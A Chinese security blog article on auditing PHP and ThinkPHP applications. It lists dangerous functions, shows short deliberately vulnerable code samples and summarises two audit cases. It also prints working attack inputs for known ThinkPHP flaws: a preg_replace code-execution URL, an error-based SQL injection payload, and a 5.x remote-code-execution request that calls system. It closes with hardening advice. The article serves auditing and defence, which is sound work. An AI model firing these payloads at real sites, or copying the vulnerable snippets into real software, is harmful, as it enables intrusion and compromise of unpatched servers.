#  审计技巧 | TP框架的系统如何快速高效挖掘漏洞   
 WK安全   2025-03-29 10:46  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
    我们系统整理了PHP的审计技巧及ThinkPHP框架的审计技巧。通过对这些文章的深入研究，结合其他权威资源，我们提取了一系列实用的代码审计方法和技巧，旨在帮助安全研究人员和开发者更有效地发现和修复PHP及ThinkPHP应用中的安全漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eDT1GogCibVVowdP8OIkqrqsj3iceMgQlUiac8OzKRbnf4icdIAk5OytXg9b4Djnr9hOjmuBSRRq7nLQ/640?wx_fmt=png&from=appmsg "")  
## 0x01 PHP代码审计技巧  
#### 1.1 追踪调用链分析法  
  
从入口文件开始，追踪用户输入的处理流程，分析参数传递和函数调用链。  
  
  
```
// 入口文件分析<?php  ob_start();  date_default_timezone_set("Asia/Manila");  $action = $_GET['action'];            //Get请求action  include 'admin_class.php';            //引用admin_class.php  $crud = new Action();  //省略其他无用代码......  ...  if($action == 'update_user'){      $save = $crud->update_user();      if($save)          echo $save;  ...
```  
  
  
  
通过追踪update_user  
方法的调用链，发现了文件上传漏洞。  
####   
#### 1.2 危险函数审计法  
  
搜索常见危险函数（如eval  
、system  
、exec  
、shell_exec  
、curl_exec  
等），检查这些函数的参数是否可控，分析函数前的过滤和验证措施是否充分。  
  
**常见危险函数列表**  
：  
- 代码执行：eval()  
, assert()  
, preg_replace(/e)  
, create_function()  
  
- 命令执行：system()  
, exec()  
, shell_exec()  
, passthru()  
, pcntl_exec()  
, popen()  
  
- 文件操作：include()  
, require()  
, file_get_contents()  
, file_put_contents()  
, unlink()  
  
- 网络请求：curl_exec()  
, file_get_contents()  
, fsockopen()  
  
####   
#### 1.3 黑白盒结合审计法  
  
先进行黑盒测试，了解应用功能和可能的漏洞点，再进行白盒审计，定位和验证漏洞。使用自动化工具辅助审计，但不完全依赖工具。  
## 0x02 常见漏洞类型审计技巧  
#### 2.1 SQL注入漏洞  
- **搜索数据库操作函数**  
：如mysql_query  
、mysqli_query  
、PDO::query  
等  
  
- **检查SQL语句构造过程**  
：是否使用参数化查询  
  
- **分析用户输入的过滤和转义措施**  
：是否使用mysql_real_escape_string  
等函数  
  
- **关注特殊SQL语法**  
：如UNION、子查询、批量操作等  
  
**示例漏洞代码**  
：  
  
```
// 入口文件分析$id = $_GET['id'];$query = "SELECT * FROM users WHERE id = $id"; // 未过滤的用户输入直接拼接到SQL语句中$result = mysql_query($query);
```  
  
####   
#### 2.2 XSS漏洞  
- **检查用户输入如何输出到页面**  
：是否直接输出未过滤的用户输入  
  
- **分析是否使用了**htmlspecialchars**等函数进行转义**  
：是否设置了正确的参数  
  
- **关注模板引擎的输出机制**  
：是否自动转义特殊字符  
  
**示例漏洞代码**  
：  
  
```
$name = $_GET['name'];echo "Welcome, $name!"; // 未过滤的用户输入直接输出到页面
```  
  
####   
#### 2.3 文件包含漏洞  
- **搜索**include**、**require**等函数**  
：这些函数是否包含用户可控的参数  
  
- **检查包含的文件路径是否用户可控**  
：是否有路径限制  
  
- **分析路径限制和过滤措施**  
：是否可以通过特殊字符绕过  
  
**示例漏洞代码**  
：  
  
```
$page = $_GET['page'];include($page . ".php"); // 未过滤的用户输入直接用于文件包含
```  
  
####   
#### 2.4 命令执行漏洞  
- **搜索**system**、**exec**、**shell_exec**、**passthru**等函数**  
：这些函数是否包含用户可控的参数  
  
- **检查命令构造过程**  
：是否存在命令注入风险  
  
- **分析命令参数的过滤和验证措施**  
：是否过滤了特殊字符  
  
**示例漏洞代码**  
：  
  
```
$cmd = $_GET['cmd'];system("ping " . $cmd); // 未过滤的用户输入直接用于命令执行
```  
  
  
  
2.5 文件上传漏洞  
- **检查文件上传功能**  
：是否验证文件类型和内容  
  
- **分析文件类型验证机制**  
：是否仅依赖MIME类型或文件扩展名  
  
- **检查上传目录权限**  
：上传的文件是否可执行  
  
**示例漏洞代码**  
：  
  
```
if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){      $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];      $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);      // 没有验证文件类型和内容}
```  
  
####   
#### 2.6 反序列化漏洞  
- **搜索**unserialize**函数**  
：参数是否用户可控  
  
- **检查反序列化数据是否用户可控**  
：是否有过滤和验证  
  
- **分析应用中可利用的类和魔术方法**  
：如__wakeup  
、__destruct  
等  
  
**示例漏洞代码**  
：  
  
```
$data = $_COOKIE['data'];$obj = unserialize($data); // 未过滤的用户输入直接用于反序列化
```  
  
## 0x03 ThinkPHP框架审计技巧  
### 1. 框架特性与版本识别  
  
ThinkPHP是国内著名的PHP开发框架，基于MVC模式。不同版本的ThinkPHP存在不同的安全特性和漏洞，因此首先需要识别框架版本。  
  
**版本识别方法**  
：  
- 查看页面底部或HTTP响应头中的版本信息  
  
- 分析异常页面中的框架信息  
  
- 检查框架文件和目录结构  
  
**各版本特点**  
：  
- **ThinkPHP 2.x**  
：早期版本，存在大量preg_replace /e模式代码执行漏洞  
  
- **ThinkPHP 3.x**  
：使用较广泛的版本，存在where注入、日志文件泄露等漏洞  
  
- **ThinkPHP 5.x**  
：现代版本，存在多个远程代码执行漏洞  
  
- **ThinkPHP 6.x**  
：最新版本，安全性有所提高，但仍需关注最新漏洞  
  
### 2. 目录结构分析  
  
ThinkPHP各版本的目录结构有所不同，但通常包含以下关键目录：  
  
**ThinkPHP 3.x目录结构**  
：  
  
```
WEB部署目录（或者子目录）├─index.php 入口文件├─README.md README文件├─Application 应用目录├─Public资源文件目录└─ThinkPHP框架目录
```  
  
  
**ThinkPHP 5.x目录结构**  
：  
  
```
WEB部署目录（或者子目录）├─application           应用目录│  ├─common             公共模块目录│  ├─module_name        模块目录│  │  ├─common.php      模块函数文件│  │  ├─controller      控制器目录│  │  ├─model           模型目录│  │  ├─view            视图目录│  │  └─ ...            更多类库目录│  ││  ├─command.php        命令行定义文件│  ├─common.php         公共函数文件│  └─config.php         公共配置文件│├─public                WEB目录（对外访问目录）│  ├─index.php          入口文件│  ├─router.php         快速测试文件│  └─.htaccess          用于apache的重写│├─thinkphp              框架系统目录│  ├─lang               语言文件目录│  ├─library            框架类库目录│  │  ├─think           Think类库包目录│  │  └─traits          系统Trait目录│  ││  ├─tpl                系统模板目录│  ├─base.php           基础定义文件│  ├─console.php        控制台入口文件│  ├─convention.php     框架惯例配置文件│  ├─helper.php         助手函数文件│  ├─phpunit.xml        phpunit配置文件│  └─start.php          框架入口文件│├─extend                扩展类库目录├─runtime               应用的运行时目录（可写，可定制）├─vendor                第三方类库目录（Composer依赖库）├─build.php             自动生成定义文件├─composer.json         composer 定义文件├─LICENSE.txt           授权说明文件├─README.md             README 文件├─think                 命令行入口文件
```  
  
  
审计要点  
：  
- 检查入口文件的安全配置  
  
- 审计应用目录下的控制器文件  
  
- 分析配置文件中的安全相关设置  
  
- 检查日志目录的访问权限  
  
### 3. 路由解析与控制器审计  
  
ThinkPHP的路由解析机制是审计的重点，不同版本的路由解析方式有所不同。  
  
**ThinkPHP 3.x路由格式**  
：  
  
```
http://example.com/index.php/模块/控制器/方法/参数名/参数值****
```  
  
  
**ThinkPHP 5.x路由格式**  
：  
  
```
http://example.com/index.php/模块/控制器/方法/参数名/参数值
```  
  
  
**路由审计要点**  
：  
- 检查路由配置文件  
  
- 分析URL参数的处理过程  
  
- 关注路由解析中的过滤措施  
  
- 检查自定义路由规则  
  
**控制器审计要点**  
：  
- 检查控制器中的公开方法  
  
- 分析参数绑定和自动获取机制  
  
- 关注权限验证机制  
  
- 检查敏感操作的实现  
  
### 4. 请求参数处理审计  
  
ThinkPHP提供了多种获取请求参数的方法，如I()、input()等。  
  
**ThinkPHP 3.x参数获取**  
：  
  
```
$id = I('get.id');  // 获取GET参数id
```  
  
  
**ThinkPHP 5.x参数获取**  
：  
  
```
$id = input('id');  // 获取参数id
```  
  
  
**参数处理审计要点**  
：  
- 检查参数获取方法的使用  
  
- 分析参数过滤和验证措施  
  
- 关注参数类型转换  
  
- 检查参数直接带入SQL查询的情况  
  
### 5. 数据库操作审计  
  
ThinkPHP提供了多种数据库操作方法，如M()、D()、Db::table()等。  
  
**ThinkPHP 3.x数据库操作**  
：  
  
```
$User = M('User');$result = $User->where('id='.$id)->find();  // 可能存在SQL注入
```  
  
  
**ThinkPHP 5.x数据库操作**  
：  
  
```
$result = Db::table('user')->where('id', $id)->find();  // 参数化查询，较安全
```  
  
  
**数据库操作审计要点**  
：  
- 检查数据库操作方法的使用  
  
- 分析where条件的构造方式  
  
- 关注原生SQL查询的使用  
  
- 检查数据库配置的安全性  
  
### 6. 模板引擎漏洞审计  
  
ThinkPHP的模板引擎是代码执行漏洞的高发区域。  
  
**模板引擎审计要点**  
：  
- 检查模板文件的包含和渲染过程  
  
- 分析模板中的变量输出和过滤  
  
- 关注自定义标签和函数的解析  
  
- 检查模板缓存的生成和使用  
  
**示例漏洞代码**  
：  
  
```
// ThinkPHP 5.x模板引擎RCE$this->assign('name', $name);  // $name可控$this->display();  // 模板引擎解析时可能导致代码执行
```  
  
### 7. 版本特定漏洞审计  
  
不同版本的ThinkPHP存在不同的安全漏洞，需要针对性审计。  
#### 7.1 ThinkPHP 2.x漏洞  
  
**preg_replace /e模式代码执行漏洞**  
：  
  
在ThinkPHP/Lib/Think/Util/Dispatcher.class.php  
中，Dispatcher类的dispatch方法使用了preg_replace的/e模式，可能导致代码执行：  
  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
  
攻击者可以构造如下URL触发漏洞：  
  
```
http://127.0.0.1/index.php/a/b/c/${phpinfo()}
```  
  
#### 7.2 ThinkPHP 3.x漏洞  
  
**where注入漏洞**  
：  
  
在ThinkPHP 3.2.3版本中，Model类的where方法在处理数组条件时可能存在SQL注入：  
  
```
$User = M('User');$result = $User->where(array('id'=>array('exp',$id)))->find();  // $id可控时可能导致SQL注入
```  
  
  
攻击者可以构造如下参数触发漏洞：  
  
  
```
id[0]=exp&id[1]=1) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x7e,version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```  
  
#### 7.3 ThinkPHP 5.x漏洞  
  
**远程代码执行漏洞**  
：  
  
在ThinkPHP 5.0.x和5.1.x的多个版本中，Request类的method方法存在远程代码执行漏洞：  
  
```
// ThinkPHP/library/think/Request.phppublic function method($method = false){    if (true === $method) {        // 获取原始请求类型        return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);    } elseif (!$this->method) {        if (isset($_POST[Config::get('var_method')])) {            $this->method = strtoupper($_POST[Config::get('var_method')]);            $this->{$this->method}($_POST);        } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {            $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);        } else {            $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);        }    }    return$this->method;}
```  
  
  
攻击者可以构造如下请求触发漏洞：  
  
```
POST /?s=index/indexContent-Type: application/x-www-form-urlencoded_method=__construct&filter[]=system&method=get&get[]=id=whoami
```  
  
## 0x04 公众号中的审计案例分析  
### 1. Sourcecodeste Faculty Evaluation System v1.0 Rce(CVE-2023-33569)  
  
这篇文章分析了Sourcecodeste Faculty Evaluation System中的RCE漏洞，详细展示了漏洞代码和利用方法。  
  
  
**漏洞点**  
：  
- 入口文件ajax.php  
中的update_user  
方法没有进行权限验证  
  
- update_user  
方法中的文件上传功能没有验证文件类型和内容  
  
**审计技巧**  
：  
- 从入口文件开始分析，追踪调用链  
  
- 关注无需鉴权就能访问的功能点  
  
- 检查文件上传功能的安全措施  
  
### 2. 某付费短剧影视小程序后端审计(0day)  
  
这篇文章分析了基于ThinkPHP 5.0.24和Fastadmin框架开发的应用中的多个漏洞。  
  
  
**漏洞点**  
：  
- 前台任意文件读取漏洞（Fastadmin框架）  
  
- 前台任意文件读取+SSRF漏洞（Curl_exec函数参数可控）  
  
- 前台敏感信息泄露（无权限验证的接口）  
  
- Fastadmin Getshell（模板引擎漏洞）  
  
- 任意文件读取+Log日志泄露组合利用  
  
**审计技巧**  
：  
- 识别目标应用使用的框架及版本  
  
- 利用框架的Debug模式获取更多信息  
  
- 关注框架的特殊路由和控制器  
  
- 检查模板引擎的安全配置  
  
- 分析日志文件的存储位置和访问权限  
  
## 0x05 工具与修复建议  
### 1. PHP项目安全加固建议  
- 使用最新版本的PHP  
  
- 禁用危险函数（如eval、system等）  
  
- 实施输入验证和输出编码  
  
- 使用参数化查询防止SQL注入  
  
- 实施严格的文件上传验证  
  
- 使用安全的会话管理机制  
  
- 实施适当的错误处理和日志记录  
  
### 2. ThinkPHP项目安全加固建议  
- 使用最新版本的ThinkPHP框架  
  
- 关闭生产环境中的Debug模式  
  
- 配置合理的路由规则和访问控制  
  
- 使用框架提供的安全功能（如验证器、过滤器等）  
  
- 实施严格的模板变量过滤  
  
- 使用ORM的参数绑定功能  
  
- 保护好配置文件和日志文件  
  
- 定期更新框架和应用补丁  
  
### 3. 代码审计工具推荐  
- **静态分析工具**  
：RIPS、Seay源代码审计系统、Cobra  
  
- **动态调试工具**  
：Xdebug、PHPStorm调试器  
  
- **漏洞扫描工具**  
：AWVS、Burp Suite  
  
- **代码质量工具**  
：SonarQube、PHP_CodeSniffer  
  
## 0x06 结论  
  
    我们总结了一系列PHP和ThinkPHP框架的审计技巧。这些技巧涵盖了从方法论到具体漏洞类型的多个维度，为安全研究人员和开发者提供了全面的指导。  
  
  
    PHP代码审计需要关注危险函数、用户输入处理、文件操作和权限验证等方面，而ThinkPHP框架审计则需要额外关注框架特性、路由解析、模板引擎和版本特定漏洞等方面。  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
